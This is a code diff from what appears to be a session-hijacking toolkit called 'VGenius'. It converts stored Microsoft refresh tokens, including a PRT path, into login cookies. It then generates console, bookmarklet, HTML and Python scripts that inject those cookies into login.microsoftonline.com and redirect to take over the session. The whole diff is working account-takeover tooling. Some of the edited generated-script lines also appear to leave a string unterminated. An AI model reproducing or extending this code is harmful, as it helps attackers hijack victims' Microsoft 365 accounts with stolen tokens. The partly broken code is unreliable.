@@ -245,8 +245,9 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
         const cookieConverter = require('../services/cookieconverter');
         const templateType = token.template_type || 'office';
         console.log('[Tokens] Exchanging refresh token for fresh cookies...');
+        // Pass userId (req.user.id) so the stored DRS PRT cookie path works
         const conversionResult = await cookieConverter.convertTokensToCookies(
-          refreshToken, templateType, tenant, null, accountType
+          refreshToken, templateType, tenant, null, accountType, req.user.id
         );
         if (conversionResult.success && conversionResult.cookies) {
           cookies = conversionResult.cookies;
@@ -355,15 +356,25 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     // Generate simple direct injection script (works on login.microsoftonline.com)
     var directScript = generateDirectInjectionScript(cookiesList, prtScript);
 
+    // Generate bookmarklet script (document.cookie format with correct domain)
+    var bookmarklet = '';
+    if (cookiesList.length > 0) {
+      var cookieConverter = require('../services/cookieconverter');
+      var formattedCookies = cookieConverter.formatCookiesForInjection(cookiesList);
+      bookmarklet = cookieConverter.generateBookmarkletScript(formattedCookies);
+    }
+
     var scripts = {};
     scripts.console = directScript;
     scripts.prt = prtScript;
+    scripts.bookmarklet = bookmarklet;
     scripts.html = cookiesList.length > 0 ? generateStandaloneHtml(cookiesList) : '';
     scripts.python = cookiesList.length > 0 ? generatePythonScript(cookiesList) : '';
 
     res.json({
       script: directScript,
       prt_script: prtScript,
+      bookmarklet: bookmarklet,
       scripts: scripts,
       cookie_count: cookiesList.length,
       cookies: cookiesList,
@@ -521,7 +532,10 @@ function generatePopupScript(cookies) {
   output += '    for (var i = 0; i < domainCookies.length; i++) {\n';
   output += '      var c = domainCookies[i];\n';
   output += '      try {\n';
-  output += '        document.cookie = c.name + "=" + encodeURIComponent(c.value) + "; domain=" + c.domain + "; path=/; Secure; SameSite=None";\n';
+  output += '        // Use .login.microsoftonline.com (NOT .microsoftonline.com) because\n';
+  output += '        // document.cookie CANNOT set parent-domain cookies.\n';
+  output += '        // The user MUST be on login.microsoftonline.com for this to work.\n';
+  output += '        document.cookie = c.name + "=" + encodeURIComponent(c.value) + "; domain=.login.microsoftonline.com; path=" + (c.path || "/") + "; Secure; SameSite=" + (c.sameSite || "None") + ";\n';
   output += '        injected++;\n';
   output += '      } catch(e) {}\n';
   output += '    }\n';
@@ -600,6 +614,8 @@ function generateDirectInjectionScript(cookies, prtScript) {
 
   var output = '// VGenius Cookie Injection Script\n';
   output += '// IMPORTANT: Paste this in console on https://login.microsoftonline.com\n';
+  output += '// Uses domain=.login.microsoftonline.com (NOT .microsoftonline.com)\n';
+  output += '// because document.cookie CANNOT set parent-domain cookies.\n';
   output += '(function() {\n';
   output += '  "use strict";\n';
   output += '  var injected = 0;\n';
@@ -608,11 +624,12 @@ function generateDirectInjectionScript(cookies, prtScript) {
   output += '\n';
   output += '  console.log("[VGenius] Starting cookie injection... " + cookies.length + " cookies");\n';
   output += '\n';
-  output += '  // Set all cookies without domain attribute (works for current page)\n';
+  output += '  // Set cookies with domain=.login.microsoftonline.com\n';
+  output += '  // This is REQUIRED for SSO - cookies must be sent to all subdomains\n';
   output += '  for (var i = 0; i < cookies.length; i++) {\n';
   output += '    var c = cookies[i];\n';
   output += '    try {\n';
-  output += '      document.cookie = c.name + "=" + encodeURIComponent(c.value) + "; path=/; Secure; SameSite=None";\n';
+  output += '      document.cookie = c.name + "=" + encodeURIComponent(c.value) + "; domain=.login.microsoftonline.com; path=" + (c.path || "/") + "; Secure; SameSite=" + (c.sameSite || "None") + ";\n';
   output += '      injected++;\n';
   output += '      console.log("[VGenius] Set: " + c.name);\n';
   output += '    } catch(e) {\n';
@@ -623,11 +640,11 @@ function generateDirectInjectionScript(cookies, prtScript) {
   output += '\n';
   output += '  console.log("[VGenius] Successfully injected " + injected + "/" + cookies.length + " cookies");\n';
   output += '\n';
-  output += '  // Wait 2s then redirect to trigger SSO\n';
+  output += '  // Wait 1.5s then redirect to trigger SSO\n';
   output += '  setTimeout(function() {\n';
-  output += '    console.log("[VGenius] Redirecting to Office 365...");\n';
-  output += '    window.location.href = "https://www.office.com/";\n';
-  output += '  }, 2000);\n';
+  output += '    console.log("[VGenius] Redirecting to login.microsoftonline.com...");\n';
+  output += '    window.location.href = "https://login.microsoftonline.com/";\n';
+  output += '  }, 1500);\n';
   output += '})();\n';
 
   return output;
@@ -730,7 +747,9 @@ function generateStandaloneHtml(cookies) {
   html += '     for (var i = 0; i < domainCookies.length; i++) {\\n';
   html += '       var c = domainCookies[i];\\n';
   html += '       try {\\n';
-  html += '         document.cookie = c.name + \"=\" + encodeURIComponent(c.value) + \"; domain=\" + c.domain + \"; path=/; Secure; SameSite=None\";\\n';
+  html += '         // Use .login.microsoftonline.com (NOT .microsoftonline.com)\\n';
+html += '         // because document.cookie CANNOT set parent-domain cookies.\\n';
+html += '         document.cookie = c.name + \"=\" + encodeURIComponent(c.value) + \"; domain=.login.microsoftonline.com; path=\" + (c.path || \"/\") + \"; Secure; SameSite=\" + (c.sameSite || \"None\") + \";\\n';
   html += '         injected++;\\n';
   html += '       } catch(e) { console.warn(\"Failed to set cookie on \" + domain + \": \" + c.name); }\\n';
   html += '     }\\n';
@@ -769,7 +788,8 @@ function generateStandaloneHtml(cookies) {
   html += '     script += \"  var cookies = \" + JSON.stringify(cookies) + \";\\n\";\\n';
   html += '     script += \"  cookies.forEach(function(c) {\\n\";\\n';
   html += '     script += \"    try {\\n\";\\n';
-  html += '     script += \"      document.cookie = c.name + \\\"=\\\" + encodeURIComponent(c.value) + \\\"; domain=\\\" + c.domain + \\\"; path=/; Secure; SameSite=None\\\";\\n\";\\n';
+  html += '     script += \"      // Use .login.microsoftonline.com (NOT .microsoftonline.com)\\n\";\\n';
+html += '     script += \"      document.cookie = c.name + \\\"=\\\" + encodeURIComponent(c.value) + \\\"; domain=.login.microsoftonline.com; path=\\\" + (c.path || \\\"/\\\") + \\\"; Secure; SameSite=\\\" + (c.sameSite || \\\"None\\\") + \\\";\\n\";\\n';
   html += '     script += \"    } catch(e) {}\\n\";\\n';
   html += '     script += \"  });\\n\";\\n';
   html += '     script += \"  console.log(\\\"[VGenius] Injected \" + cookies.length + \" cookies. Refresh the page.\\\");\\n\";\\n';
